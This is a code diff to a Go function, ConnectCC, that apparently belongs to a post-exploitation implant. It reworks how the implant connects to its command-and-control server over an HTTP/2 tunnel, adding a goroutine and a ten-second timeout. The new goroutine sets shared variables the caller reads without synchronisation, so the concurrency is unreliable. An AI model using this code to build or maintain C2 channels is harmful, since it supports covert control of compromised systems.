@@ -98,21 +98,39 @@ func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel conte
 	var (
 		resp *http.Response
 	)
+	defer func() {
+		if conn == nil {
+			err = fmt.Errorf("ConnectCC at %s failed", url)
+			cancel()
+		}
+	}()
+
 	// use h2conn for duplex tunnel
 	ctx, cancel = context.WithCancel(context.Background())
 
 	h2 := h2conn.Client{Client: emp3r0r_data.HTTPClient}
 	log.Printf("ConnectCC: connecting to %s", url)
-	conn, resp, err = h2.Connect(ctx, url)
-	if err != nil {
-		err = fmt.Errorf("Initiate conn: %s", err)
-		return
-	}
+	go func() {
+		conn, resp, err = h2.Connect(ctx, url)
+		if err != nil {
+			err = fmt.Errorf("ConnectCC: initiate h2 conn: %s", err)
+			log.Print(err)
+			cancel()
+		}
+		// Check server status code
+		if resp != nil {
+			if resp.StatusCode != http.StatusOK {
+				err = fmt.Errorf("Bad status code: %d", resp.StatusCode)
+				return
+			}
+		}
+	}()
 
-	// Check server status code
-	if resp.StatusCode != http.StatusOK {
-		err = fmt.Errorf("Bad status code: %d", resp.StatusCode)
-		return
+	// kill connection on timeout
+	countdown := 10
+	for ctx.Err() == nil && countdown > 0 {
+		countdown--
+		time.Sleep(time.Second)
 	}
 
 	return
